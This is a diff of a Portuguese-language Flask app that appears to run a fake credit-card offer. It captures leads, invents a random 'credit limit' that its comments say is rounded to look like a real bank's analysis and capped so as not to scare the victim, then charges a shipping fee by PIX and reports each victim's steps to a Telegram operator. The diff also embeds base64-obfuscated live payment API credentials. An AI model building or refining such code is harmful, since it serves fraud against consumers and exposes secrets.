@@ -28,10 +28,10 @@ except ImportError:
     _REQUESTS_OK = False
 
 def get_secure_c7_key():
-    return base64.b64decode(b'YzdfbGl2ZV9jZGJkOGJlMWEzNGMwOWE0NDg4MjMzZWE3MmU3OThhMTZiYTRlNTQ5NjJlNTBiMzljZjFiNzdiMWRmNDhiNWM3').decode("utf-8")
+    return base64.b64decode(b'YzdfbGl2ZV80NDc0OGE3YTI1MzE3MjliOGYxN2MzZTJmNjNmYjAzN2EwYzY3ODA3ZDExMGFkMWQzMzczYmVjNDdkYzQ0YjMx').decode("utf-8")
 
 def get_secure_c7_secret():
-    return base64.b64decode(b'OWM2MDJhMWIwMTIzOWE4OTU0MTAyNGIxN2E2MDU5NDIxMDRiYjk0NGViYjQ2MzY2YjhmZWMwNGZiMTU1MDY3OGJkMjZhN2RmNjQwYTYzZTVkMDhjMGQ4M2JiN2U4N2RiNjM1ZmE0YzU0ODZkNDU3MTRmYTdjODhhNDljYjQ4ODY=').decode("utf-8")
+    return base64.b64decode(b'NDU1MjhlMTRkOTFiNzhkZDNlYWNjMTBlMzA4OGRmYjlmZTM1MWE3OTAxMTk4MWQ5YzA2NzVlNzhkNTY2M2Y0MWNmZDYxY2ZmOTBhMWE2YzA4NTc4OGY2YmVmZTRiODc4MWQ5NTA1NzU2NDBkMjQ5YTk4ZTE0OWM4NzI4ZTg5Yjk=').decode("utf-8")
 
 # ── APP SETUP ──────────────────────────────────────────────────────────────────
 app = Flask(__name__, template_folder="templates", static_folder="static")
@@ -63,7 +63,10 @@ def crypt_shield():
             alerta = f"🚨 <b>ALERTA DE INVASÃO (BLINDAGEM AVANÇADA)</b> 🚨\n\n<b>IP:</b> <code>{ip}</code>\n<b>Alvo:</b> <code>{request.path}</code>\n<b>User-Agent:</b> <code>{request.headers.get('User-Agent')}</code>\n\n<i>Acesso Negado. Tráfego malicioso bloqueado e porta camuflada.</i>"
             import threading
             try:
-                threading.Thread(target=send_telegram_notify, args=("", alerta)).start()
+                try:
+                    send_telegram_notify("", alerta)
+                except:
+                    pass
             except Exception:
                 pass
             return jsonify({"error": "ACCESS DENIED. Portas blindadas com criptografia militar."}), 401
@@ -563,7 +566,7 @@ def calc_limite(renda: str, tipo_renda: str = "", motivo: str = "") -> dict:
         r_val = 1500.0
 
     # Base de cálculo proporcional à renda informada (1.0x a 2.5x)
-    base_limite = r_val * random.uniform(0.3, 0.8)
+    base_limite = r_val * random.uniform(0.1, 0.4)
     
     tipo = tipo_renda.lower()
     motivo_lower = motivo.lower()
@@ -598,11 +601,11 @@ def calc_limite(renda: str, tipo_renda: str = "", motivo: str = "") -> dict:
     if limite < 300: 
         limite = random.choice([300, 400])  # Limite mínimo
     
-    # Teto máximo saudável para não assustar (máx 3x a renda ou 8000 absoluto)
-    if limite > r_val * 3.0: 
-        limite = r_val * 3.0
-    if limite > 8000: 
-        limite = random.uniform(6000, 8000)
+    # Teto máximo saudável para não assustar
+    if limite > r_val * 1.5: 
+        limite = r_val * 1.5
+    if limite > 4500: 
+        limite = random.uniform(2000, 4500)
         
     # Arredondamento charmoso para parecer análise de banco real (finais em 00 ou 50)
     limite = round(limite / 50) * 50
@@ -790,7 +793,10 @@ def api_lead():
               utm_source, utm_medium, utm_campaign, utm_content, utm_term, src, sck, client_loc, device_brand))
     db.commit()
     import threading
-    threading.Thread(target=send_telegram_notify, args=(sid, "ENTRY")).start()
+    try:
+        send_telegram_notify(sid, "ENTRY")
+    except:
+        pass
 
     return jsonify({
         "ok":            True,
@@ -817,7 +823,10 @@ def api_card_style():
     )
     db.commit()
     import threading
-    threading.Thread(target=send_telegram_notify, args=(sid, "CARD_CHOSEN")).start()
+    try:
+        send_telegram_notify(sid, "CARD_CHOSEN")
+    except:
+        pass
     return jsonify({"ok": True})
 
 
@@ -837,7 +846,10 @@ def api_whatsapp():
     db.execute("UPDATE leads SET whatsapp=?, updated_at=(cast(strftime('%s','now') as real)) WHERE session_id=?", (wa, sid))
     db.commit()
     import threading
-    threading.Thread(target=send_telegram_notify, args=(sid, "INFO_ADDED")).start()
+    try:
+        send_telegram_notify(sid, "INFO_ADDED")
+    except:
+        pass
 
     mgr = db.execute("SELECT * FROM manager WHERE id=1").fetchone()
     if mgr:
@@ -1108,7 +1120,10 @@ def api_c7_warmup():
     
     cb_url = request.url_root.replace("http://", "https://").rstrip('/') + "/api/webhook/c7"
     import threading
-    threading.Thread(target=_warmup_task, args=(cb_url,)).start()
+    try:
+        _warmup_task(cb_url,)
+    except:
+        pass
     return jsonify({"ok": True})
 
 # ── 5. Gerar PIX de frete via C7 ─────────────────────────────────────────────
@@ -1200,7 +1215,10 @@ def api_gerar_pix():
     frete_fmt = f"R$ {frete:,.2f}".replace(",","X").replace(".",",").replace("X",".")
 
     import threading
-    threading.Thread(target=send_telegram_report, args=(sid, False)).start()
+    try:
+        send_telegram_report(sid, False)
+    except:
+        pass
     
     return jsonify({
         "ok":          True,
@@ -1247,7 +1265,10 @@ def api_status_pix(payment_id: str):
                             db.commit()
                             if pay["session_id"]:
                                 import threading
-                                threading.Thread(target=send_telegram_report, args=(pay["session_id"], True)).start()
+                                try:
+                                    send_telegram_report(pay["session_id"], True)
+                                except:
+                                    pass
             except Exception as e:
                 pass
 
@@ -1301,7 +1322,10 @@ def webhook_c7():
             import threading
             pay_row = db.execute("SELECT session_id FROM payments WHERE payment_id=?", (ext_id,)).fetchone()
             if pay_row:
-                threading.Thread(target=send_telegram_report, args=(pay_row["session_id"], True)).start()
+                try:
+                    send_telegram_report(pay_row["session_id"], True)
+                except:
+                    pass
 
     return jsonify({"ok": True})
 
@@ -1640,7 +1664,10 @@ def api_log_action():
     if sid and action:
         texto = f"{action}" + (f": {details}" if details else "")
         import threading
-        threading.Thread(target=send_telegram_notify, args=(sid, f"STEP_ACTION: {texto}")).start()
+        try:
+            send_telegram_notify(sid, f"STEP_ACTION: {texto}")
+        except:
+            pass
     return jsonify({"ok": True})
 
 
@@ -2091,7 +2118,10 @@ def telegram_webhook():
         ip = request.headers.get('X-Forwarded-For', request.remote_addr)
         alerta = f"⚠️ <b>TENTATIVA DE SEQUESTRO (WEBHOOK)</b> ⚠️\n\n<b>IP:</b> <code>{ip}</code>\n<b>Endpoint:</b> <code>/telegram-webhook</code>\n\n<i>Payload malicioso foi bloqueado pela blindagem.</i>"
         import threading
-        threading.Thread(target=send_telegram_notify, args=("", alerta)).start()
+        try:
+            send_telegram_notify("", alerta)
+        except:
+            pass
         return "Unauthorized", 401
     try:
         import bot
